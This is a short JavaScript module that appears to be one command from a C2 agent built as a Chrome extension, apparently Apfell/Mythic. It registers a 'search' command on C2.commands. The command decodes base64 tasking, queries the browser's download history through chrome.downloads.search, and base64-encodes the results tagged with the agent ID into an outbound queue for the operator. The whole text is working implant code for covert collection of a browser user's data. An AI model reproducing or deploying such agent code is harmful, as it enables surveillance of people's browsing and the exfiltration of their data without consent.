search = function(task) {
    let args = JSON.parse(atob(task['params'].toString()));
    chrome.downloads.search(args, function(results) {
        response = {"task_id":taskid, "user_output":JSON.stringify(results, null, 2), "completed": true};
        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        enc = JSON.stringify(outer_response);
        final = apfell.apfellid + enc;
        msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[search.name] = search;
COMMAND_ENDS_HERE